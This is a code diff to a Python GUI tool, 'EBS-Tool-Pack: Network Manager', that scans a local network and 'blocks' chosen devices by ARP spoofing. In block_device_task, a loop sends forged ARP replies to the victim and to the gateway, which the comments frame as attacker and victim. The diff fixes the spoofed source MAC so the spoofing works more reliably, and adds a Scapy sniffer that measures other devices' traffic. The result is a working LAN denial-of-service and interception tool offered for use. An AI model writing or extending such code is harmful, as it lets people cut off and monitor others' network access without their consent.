@@ -9,6 +9,7 @@ import psutil
 import time
 import os  # Added for file operations
 import logging  # For file logging
+from collections import defaultdict  # For easier bandwidth counting
 
 # ---- Block environment variables that may cause PermissionError
 os.environ.pop("SSLKEYLOGFILE", None)
@@ -39,12 +40,17 @@ logger.addHandler(file_handler)
 
 # ====== Helper Functions (can be used by class methods) ======
 def get_active_network_info():
-    """Extracts information about active network interfaces."""
+    """Extracts information about active network interfaces and returns a primary one."""
     active_interfaces = psutil.net_if_stats()
     net_addrs = psutil.net_if_addrs()
     info = ""
+    primary_interface_name = None
+
     for interface, stats in active_interfaces.items():
-        if stats.isup:  # Only consider active interfaces
+        if stats.isup and interface != 'lo':  # Exclude loopback interface
+            if not primary_interface_name:  # Take the first active non-loopback interface
+                primary_interface_name = interface
+
             for addr in net_addrs[interface]:
                 if addr.family == socket.AF_INET:  # IPv4 address
                     info += f"Interface: {interface}\n"
@@ -57,7 +63,7 @@ def get_active_network_info():
                         if mac_addr.family == psutil.AF_LINK:
                             info += f"  MAC Address: {mac_addr.address}\n"
                     info += "\n"
-    return info if info else "No active network interfaces found with IPv4."
+    return info if info else "No active network interfaces found with IPv4.", primary_interface_name
 
 
 def scan_network(ip_range):
@@ -95,9 +101,22 @@ def get_my_mac():
 
     # Iterate through network interfaces to find an active one with a MAC address
     for interface_name, addrs in interfaces.items():
-        if interface_name in active_stats and active_stats[interface_name].isup:
+        if interface_name in active_stats and active_stats[interface_name].isup and interface_name != 'lo':
             for addr in addrs:
                 if addr.family == psutil.AF_LINK:  # AF_LINK is for MAC addresses
+                    return addr.address
+    return None
+
+
+def get_my_ip():
+    """Retrieves the IPv4 address of the local machine's primary active interface."""
+    interfaces = psutil.net_if_addrs()
+    active_stats = psutil.net_if_stats()
+
+    for interface_name, addrs in interfaces.items():
+        if interface_name in active_stats and active_stats[interface_name].isup and interface_name != 'lo':
+            for addr in addrs:
+                if addr.family == socket.AF_INET:  # IPv4 address
                     return addr.address
     return None
 
@@ -110,8 +129,8 @@ class NetworkToolGUI:
 
         self.root = ctk.CTk()
         self.root.title("EBS-Tool-Pack: Network Manager")
-        self.root.geometry("1200x750")  # Increased width to accommodate two columns
-        self.root.minsize(1100, 650)  # Increased min-width
+        self.root.geometry("1400x850")  # Increased width/height to accommodate bandwidth monitor
+        self.root.minsize(1300, 750)  # Increased min-width/height
 
         # Colors (Black-Gray theme inspired by EBS-Tool-Pack style)
         self.colors = {
@@ -132,6 +151,20 @@ class NetworkToolGUI:
         self.blocking_thread = None
         self.blocked_device_ip = None  # IP of the device currently being blocked
         self.blocked_device_mac = None  # MAC of the device currently being blocked
+
+        # State variables for bandwidth monitoring
+        self.bandwidth_monitor_active = False
+        self.bandwidth_thread = None
+        self.current_bytes_per_ip = defaultdict(int)  # Stores accumulated bytes per IP for the current interval
+        self.bandwidth_lock = threading.Lock()  # For thread-safe access to current_bytes_per_ip
+        self.bandwidth_display_labels = {}  # Maps IP to a CTkLabel for displaying its bandwidth
+        self.bandwidth_monitor_interval_ms = 1000  # Update GUI every 1 second
+        self.bandwidth_update_job_id = None  # Stores the ID for the scheduled root.after call
+
+        # Local machine info
+        self.my_ip = get_my_ip()
+        self.my_mac = get_my_mac()
+        self.active_interface_name = None  # To be set by get_active_network_info_task
 
         # Main container
         self.main_container = ctk.CTkFrame(self.root, fg_color=self.colors['bg'])
@@ -180,7 +213,8 @@ class NetworkToolGUI:
                                                                                                                 column=0,
                                                                                                                 sticky="w",
                                                                                                                 padx=(
-                                                                                                                0, 10),
+                                                                                                                    0,
+                                                                                                                    10),
                                                                                                                 pady=5)
         self.ip_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter IP range for scanning",
                                      fg_color=self.colors['bg'], border_color=self.colors['accent'])
@@ -190,7 +224,8 @@ class NetworkToolGUI:
                                                                                                                column=0,
                                                                                                                sticky="w",
                                                                                                                padx=(
-                                                                                                               0, 10),
+                                                                                                                   0,
+                                                                                                                   10),
                                                                                                                pady=5)
         self.gateway_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter Gateway IP for blocking",
                                           fg_color=self.colors['bg'], border_color=self.colors['accent'])
@@ -212,17 +247,24 @@ class NetworkToolGUI:
                                       height=35)
         self.btn_scan.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
 
+        self.btn_monitor_bandwidth = ctk.CTkButton(action_buttons_frame, text="Start Bandwidth Monitor",
+                                                   command=self._start_stop_bandwidth_monitor,
+                                                   fg_color=self.colors['success'],
+                                                   hover_color=self.colors['success'],
+                                                   height=35)
+        self.btn_monitor_bandwidth.grid(row=1, column=0, sticky="ew", padx=5, pady=5)
+
         # Main Unblock/Stop Blocking button
         self.btn_unblock_all = ctk.CTkButton(action_buttons_frame, text="Unblock All Devices",
                                              command=self._start_unblock,
-                                             fg_color=self.colors['success'], hover_color=self.colors['success'],
+                                             fg_color=self.colors['warning'], hover_color=self.colors['warning'],
                                              height=35)
         self.btn_unblock_all.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
 
-        # Blocking Status Indicator
+        # Status Indicator (Blocking and Bandwidth Monitor)
         self.blocking_status_label = ctk.CTkLabel(action_buttons_frame, text="Status: Idle",
                                                   text_color=self.colors['text_dim'])
-        self.blocking_status_label.grid(row=1, column=0, sticky="ew", padx=5, pady=5)
+        self.blocking_status_label.grid(row=2, column=0, sticky="ew", padx=5, pady=5, columnspan=2)
 
         # Log Panel (now on the left, row 1, column 0)
         log_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
@@ -247,7 +289,7 @@ class NetworkToolGUI:
         devices_panel.grid(row=1, column=1, sticky="nsew", padx=(10, 0), pady=(10, 0))  # Added left padding
         devices_panel.grid_rowconfigure(1, weight=1)
 
-        ctk.CTkLabel(devices_panel, text="Scanned Devices", font=ctk.CTkFont(size=18, weight="bold"),
+        ctk.CTkLabel(devices_panel, text="Scanned Devices & Bandwidth", font=ctk.CTkFont(size=18, weight="bold"),
                      text_color=self.colors['text']).pack(pady=(15, 10))
 
         # Progress bar for scanning
@@ -303,6 +345,13 @@ class NetworkToolGUI:
         self.ip_entry.configure(state=state)
         self.gateway_entry.configure(state=state)
 
+        # Bandwidth monitor button state
+        # Only enable if not currently blocking or scanning and monitor is not active
+        if not self.blocking_active and not busy and not self.bandwidth_monitor_active:
+            self.btn_monitor_bandwidth.configure(state="normal")
+        else:
+            self.btn_monitor_bandwidth.configure(state="disabled")
+
         # Device-specific block buttons
         for device_frame in self.devices_scroll_frame.winfo_children():
             if hasattr(device_frame, 'block_button'):  # Ensure it's a device entry
@@ -322,9 +371,11 @@ class NetworkToolGUI:
 
         # Unblock All/Stop Blocking button: always enabled if blocking is active
         if self.blocking_active:
-            self.btn_unblock_all.configure(state="normal", text="Stop Blocking")
+            self.btn_unblock_all.configure(state="normal", text="Stop Blocking", fg_color=self.colors['error'],
+                                           hover_color=self.colors['error'])
         else:
-            self.btn_unblock_all.configure(state=state, text="Unblock All Devices")
+            self.btn_unblock_all.configure(state=state, text="Unblock All Devices", fg_color=self.colors['warning'],
+                                           hover_color=self.colors['warning'])
 
         self.root.update_idletasks()  # Ensure UI updates immediately
 
@@ -338,11 +389,19 @@ class NetworkToolGUI:
     def show_network_info_task(self):
         """Task to fetch and display network information."""
         try:
-            info = get_active_network_info()
+            info, interface_name = get_active_network_info()
+            self.active_interface_name = interface_name  # Store the active interface name
+            if not self.active_interface_name:
+                self.gui_log_output("Warning: Could not determine primary active network interface for sniffing.",
+                                    "yellow")
+                logger.warning("Could not determine primary active network interface for sniffing.")
+
             self.root.after(0, lambda: self.log_textbox.configure(state="normal"))
             self.root.after(0, lambda: self.log_textbox.delete("1.0", ctk.END))
             self.gui_log_output("--- Active Network Information ---", "blue")
             self.gui_log_output(info, "default")
+            if self.active_interface_name:
+                self.gui_log_output(f"Primary sniffing interface detected: {self.active_interface_name}", "blue")
             self.gui_log_output("--- End Network Information ---", "blue")
             self.root.after(0, lambda: self.log_textbox.configure(state="disabled"))
         except Exception as e:
@@ -390,14 +449,17 @@ class NetworkToolGUI:
             self.root.after(0, lambda: self._set_ui_busy_state(False))
 
     def clear_device_list(self):
-        """Clears all widgets from the devices_scroll_frame."""
+        """Clears all widgets from the devices_scroll_frame and resets bandwidth labels."""
         for widget in self.devices_scroll_frame.winfo_children():
             widget.destroy()
-        # Add a header back if needed after clearing, or do it in update_device_list
+        self.bandwidth_display_labels.clear()  # Clear stored bandwidth label references
         self.scan_progress_bar.set(0)  # Reset progress bar
+        # Reset bandwidth data too when device list is cleared
+        with self.bandwidth_lock:
+            self.current_bytes_per_ip.clear()
 
     def update_device_list(self, devices):
-        """Populates the devices_scroll_frame with scanned devices."""
+        """Populates the devices_scroll_frame with scanned devices, including bandwidth labels."""
         self.clear_device_list()  # Ensure it's clean before populating
 
         if not devices:
@@ -408,16 +470,19 @@ class NetworkToolGUI:
         # Header for the device list
         header_frame = ctk.CTkFrame(self.devices_scroll_frame, fg_color="transparent")
         header_frame.pack(fill="x", pady=(5, 0))
-        header_frame.grid_columnconfigure(0, weight=2)
-        header_frame.grid_columnconfigure(1, weight=2)
-        header_frame.grid_columnconfigure(2, weight=1)
+        header_frame.grid_columnconfigure(0, weight=2)  # IP
+        header_frame.grid_columnconfigure(1, weight=2)  # MAC
+        header_frame.grid_columnconfigure(2, weight=1)  # Bandwidth
+        header_frame.grid_columnconfigure(3, weight=1)  # Action
 
         ctk.CTkLabel(header_frame, text="IP Address", font=ctk.CTkFont(weight="bold"),
                      text_color=self.colors['text']).grid(row=0, column=0, sticky="w", padx=5)
         ctk.CTkLabel(header_frame, text="MAC Address", font=ctk.CTkFont(weight="bold"),
                      text_color=self.colors['text']).grid(row=0, column=1, sticky="w", padx=5)
+        ctk.CTkLabel(header_frame, text="Bandwidth", font=ctk.CTkFont(weight="bold"),
+                     text_color=self.colors['text']).grid(row=0, column=2, sticky="w", padx=5)
         ctk.CTkLabel(header_frame, text="Action", font=ctk.CTkFont(weight="bold"), text_color=self.colors['text']).grid(
-            row=0, column=2, sticky="w", padx=5)
+            row=0, column=3, sticky="w", padx=5)
 
         for i, device in enumerate(devices):
             device_frame = ctk.CTkFrame(self.devices_scroll_frame, fg_color=self.colors['card'], corner_radius=5)
@@ -425,6 +490,7 @@ class NetworkToolGUI:
             device_frame.grid_columnconfigure(0, weight=2)
             device_frame.grid_columnconfigure(1, weight=2)
             device_frame.grid_columnconfigure(2, weight=1)
+            device_frame.grid_columnconfigure(3, weight=1)
 
             ctk.CTkLabel(device_frame, text=device['ip'], text_color=self.colors['text']).grid(row=0, column=0,
                                                                                                sticky="w", padx=5,
@@ -432,6 +498,11 @@ class NetworkToolGUI:
             ctk.CTkLabel(device_frame, text=device['mac'], text_color=self.colors['text']).grid(row=0, column=1,
                                                                                                 sticky="w", padx=5,
                                                                                                 pady=2)
+
+            # Bandwidth Label for each device
+            bandwidth_label = ctk.CTkLabel(device_frame, text="0.0 KB/s", text_color=self.colors['text_dim'])
+            bandwidth_label.grid(row=0, column=2, sticky="w", padx=5, pady=2)
+            self.bandwidth_display_labels[device['ip']] = bandwidth_label  # Store reference
 
             # Block button for each device
             block_btn = ctk.CTkButton(
@@ -443,7 +514,7 @@ class NetworkToolGUI:
                 width=80, height=25,
                 font=ctk.CTkFont(size=12)
             )
-            block_btn.grid(row=0, column=2, sticky="e", padx=5, pady=2)
+            block_btn.grid(row=0, column=3, sticky="e", padx=5, pady=2)
 
             # Store reference to the button and device info on the frame for easy access later
             device_frame.block_button = block_btn
@@ -466,6 +537,12 @@ class NetworkToolGUI:
                                    "Hãy nhập địa chỉ IP Gateway để chặn!")  # Please enter Gateway IP for blocking!
             return
 
+        if not self.my_ip or not self.my_mac:
+            messagebox.showerror("Lỗi",
+                                 "Không thể lấy địa chỉ IP/MAC cục bộ của bạn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
+            self.gui_log_output("Failed to get local IP/MAC, cannot start blocking.", "red")
+            return
+
         # Store blocked device info
         self.blocked_device_ip = ip_address
         self.blocked_device_mac = mac_address
@@ -474,7 +551,8 @@ class NetworkToolGUI:
             f"Attempting to block device - IP: {ip_address}, MAC: {mac_address} via Gateway: {gateway_ip}", "red")
         self.blocking_active = True
         self.blocking_thread = threading.Thread(target=self.block_device_task,
-                                                args=(ip_address, mac_address, gateway_ip), daemon=True)
+                                                args=(ip_address, mac_address, gateway_ip, self.my_ip, self.my_mac),
+                                                daemon=True)
         self.blocking_thread.start()
 
         # Update UI to reflect blocking state
@@ -482,12 +560,9 @@ class NetworkToolGUI:
                                                                         text_color=self.colors['error']))
         self.root.after(0, lambda: self._set_ui_busy_state(True, ip_address))
 
-    def block_device_task(self, ip_address, mac_address, gateway_ip):
+    def block_device_task(self, ip_address, mac_address, gateway_ip, my_ip, my_mac):
         """Task to continuously send ARP spoofing packets."""
         try:
-            my_ip = socket.gethostbyname(socket.gethostname())
-            my_mac = get_my_mac()
-
             if ip_address == my_ip or mac_address == my_mac:
                 self.gui_log_output("Cannot block your own device.", "red")
                 logger.error("Attempted to block own device.")  # Log error to file
@@ -504,9 +579,11 @@ class NetworkToolGUI:
 
             while self.blocking_active:
                 # Tell victim that gateway's MAC is attacker's MAC
-                packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address)
+                packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address,
+                                                             hwsrc=my_mac)
                 # Tell gateway that victim's MAC is attacker's MAC
-                packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac)
+                packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac,
+                                                              hwsrc=my_mac)
                 sendp(packet_victim, verbose=0)
                 sendp(packet_gateway, verbose=0)
                 time.sleep(2)  # Send ARP packets every 2 seconds
@@ -544,6 +621,9 @@ class NetworkToolGUI:
                     self.gui_log_output("Blocking thread did not stop gracefully.", "red")
                     logger.error("Blocking thread did not stop gracefully.")  # Log error to file
 
+        self.blocked_device_ip = None
+        self.blocked_device_mac = None  # Clear these after attempting to stop the blocking thread
+
         self._set_ui_busy_state(True)
         self.gui_log_output("Attempting to unblock all devices...", "green")
         threading.Thread(target=self.unblock_devices_task, daemon=True).start()
@@ -557,6 +637,12 @@ class NetworkToolGUI:
                 messagebox.showerror("Gateway IP Missing",
                                      "Please provide the Gateway IP in the input field to unblock devices.")
                 logger.error("Unblock failed: Gateway IP missing.")  # Log error to file
+                return
+
+            if not self.my_ip or not self.my_mac:
+                messagebox.showerror("Lỗi",
+                                     "Không thể lấy địa chỉ IP/MAC cục bộ của bạn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
+                self.gui_log_output("Failed to get local IP/MAC, cannot start unblocking.", "red")
                 return
 
             devices_to_unblock = []
@@ -622,6 +708,149 @@ class NetworkToolGUI:
             self.root.after(0, lambda: self._set_ui_busy_state(False))
             self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Idle",
                                                                             text_color=self.colors['text_dim']))
+            self.blocked_device_ip = None
+            self.blocked_device_mac = None
+
+    # --- Bandwidth Monitoring Functions ---
+    def _start_stop_bandwidth_monitor(self):
+        """Toggles the bandwidth monitoring on or off."""
+        if not self.bandwidth_monitor_active:
+            if not self.active_interface_name:
+                messagebox.showwarning("Cảnh báo",
+                                       "Không thể bắt đầu theo dõi băng thông. Vui lòng chạy 'Show Network Info' để xác định giao diện hoạt động.")
+                self.gui_log_output("Cannot start bandwidth monitor: Active interface not determined.", "yellow")
+                return
+
+            if not self.my_ip:
+                messagebox.showwarning("Cảnh báo", "Không thể lấy địa chỉ IP của bạn. Vui lòng kiểm tra kết nối mạng.")
+                self.gui_log_output("Cannot start bandwidth monitor: Local IP not determined.", "yellow")
+                return
+
+            if not self.bandwidth_display_labels:
+                messagebox.showwarning("Cảnh báo", "Hãy quét mạng trước để có các thiết bị cần theo dõi.")
+                self.gui_log_output("Cannot start bandwidth monitor: No devices scanned yet.", "yellow")
+                return
+
+            self.bandwidth_monitor_active = True
+            self.btn_monitor_bandwidth.configure(text="Stop Bandwidth Monitor", fg_color=self.colors['error'],
+                                                 hover_color=self.colors['error'])
+            self.gui_log_output(f"Starting bandwidth monitor on interface '{self.active_interface_name}'...", "green")
+            logger.info(f"Bandwidth monitor started on {self.active_interface_name}")
+
+            # Clear previous bandwidth data upon starting
+            with self.bandwidth_lock:
+                self.current_bytes_per_ip.clear()
+
+            self.bandwidth_thread = threading.Thread(target=self._bandwidth_sniff_task,
+                                                     args=(self.active_interface_name,), daemon=True)
+            self.bandwidth_thread.start()
+            self.bandwidth_update_job_id = self.root.after(self.bandwidth_monitor_interval_ms,
+                                                           self._update_bandwidth_gui)
+        else:
+            self._stop_bandwidth_monitor_task()
+
+    def _stop_bandwidth_monitor_task(self):
+        """Stops the bandwidth monitoring thread and GUI updates."""
+        if self.bandwidth_monitor_active:
+            self.bandwidth_monitor_active = False  # Signal the sniffing thread to stop
+            self.gui_log_output("Stopping bandwidth monitor...", "yellow")
+            logger.info("Bandwidth monitor stopped.")
+            self.btn_monitor_bandwidth.configure(text="Start Bandwidth Monitor", fg_color=self.colors['success'],
+                                                 hover_color=self.colors['success'])
+
+            if self.bandwidth_thread and self.bandwidth_thread.is_alive():
+                # Give Scapy's sniff a moment to recognize stop_filter
+                self.bandwidth_thread.join(timeout=2)
+                if self.bandwidth_thread.is_alive():
+                    self.gui_log_output("Bandwidth monitoring thread did not terminate gracefully.", "red")
+                    logger.error("Bandwidth monitoring thread did not terminate gracefully.")
+
+            if self.bandwidth_update_job_id:
+                self.root.after_cancel(self.bandwidth_update_job_id)
+                self.bandwidth_update_job_id = None
+
+            # Reset displayed bandwidth to 0.0 KB/s
+            for ip_addr in self.bandwidth_display_labels:
+                self.bandwidth_display_labels[ip_addr].configure(text="0.0 KB/s")
+
+            with self.bandwidth_lock:
+                self.current_bytes_per_ip.clear()
+
+    def _bandwidth_sniff_task(self, interface):
+        """
+        Target function for the sniffing thread.
+        Sniffs packets and calls _packet_callback for each packet.
+        """
+        try:
+            # Note: Scapy's sniff can block. stop_filter is crucial for graceful exit.
+            scapy.sniff(iface=interface, prn=self._packet_callback, store=0,
+                        stop_filter=lambda p: not self.bandwidth_monitor_active,
+                        filter="ip")  # Only capture IP packets
+        except Exception as e:
+            self.gui_log_output(f"Error during bandwidth sniffing: {e}", "red")
+            logger.critical(f"Critical error during bandwidth sniffing: {e}")
+        finally:
+            # Ensure GUI state is updated if sniffing stops unexpectedly
+            if self.bandwidth_monitor_active:
+                self.root.after(0, self._stop_bandwidth_monitor_task)
+
+    def _packet_callback(self, packet):
+        """
+        Callback function for scapy.sniff.
+        Accumulates bytes for source and destination IPs.
+        """
+        if not self.bandwidth_monitor_active:
+            return  # Stop processing if monitor is no longer active
+
+        if packet.haslayer(scapy.IP):
+            ip_src = packet[scapy.IP].src
+            ip_dst = packet[scapy.IP].dst
+            packet_len = len(packet)  # Get the full packet length including layers
+
+            # We are monitoring *other* devices' traffic, so if our IP is involved,
+            # attribute traffic to the *other* IP.
+            # Only count traffic for IPs that we have labels for (i.e., scanned devices)
+            with self.bandwidth_lock:
+                if ip_src != self.my_ip and ip_src in self.bandwidth_display_labels:
+                    self.current_bytes_per_ip[ip_src] += packet_len
+                if ip_dst != self.my_ip and ip_dst in self.bandwidth_display_labels:
+                    self.current_bytes_per_ip[ip_dst] += packet_len
+                # If traffic is between two monitored devices (not self), count for both
+                # This is already covered by the two if statements above.
+
+    def _update_bandwidth_gui(self):
+        """
+        Called periodically by root.after to update GUI bandwidth labels.
+        Reads accumulated bytes, calculates rate, updates labels, and resets counters.
+        """
+        if not self.bandwidth_monitor_active:
+            return
+
+        bytes_for_this_interval = {}
+        with self.bandwidth_lock:
+            bytes_for_this_interval.update(self.current_bytes_per_ip)
+            self.current_bytes_per_ip.clear()  # Reset for the next interval
+
+        interval_seconds = self.bandwidth_monitor_interval_ms / 1000.0
+
+        for ip_addr, total_bytes in bytes_for_this_interval.items():
+            if ip_addr in self.bandwidth_display_labels:  # Only update for scanned devices
+                # Calculate rate: bytes per second
+                rate_bps = total_bytes / interval_seconds
+
+                # Convert to human-readable format
+                if rate_bps >= 1024 * 1024:
+                    display_rate = f"{rate_bps / (1024 * 1024):.1f} MB/s"
+                elif rate_bps >= 1024:
+                    display_rate = f"{rate_bps / 1024:.1f} KB/s"
+                else:
+                    display_rate = f"{rate_bps:.1f} B/s"
+
+                self.bandwidth_display_labels[ip_addr].configure(text=display_rate)
+            # IPs not in self.bandwidth_display_labels (e.g., external hosts not in scan) are ignored
+
+        # Reschedule itself
+        self.bandwidth_update_job_id = self.root.after(self.bandwidth_monitor_interval_ms, self._update_bandwidth_gui)
 
     def run(self):
         """Starts the main GUI event loop."""
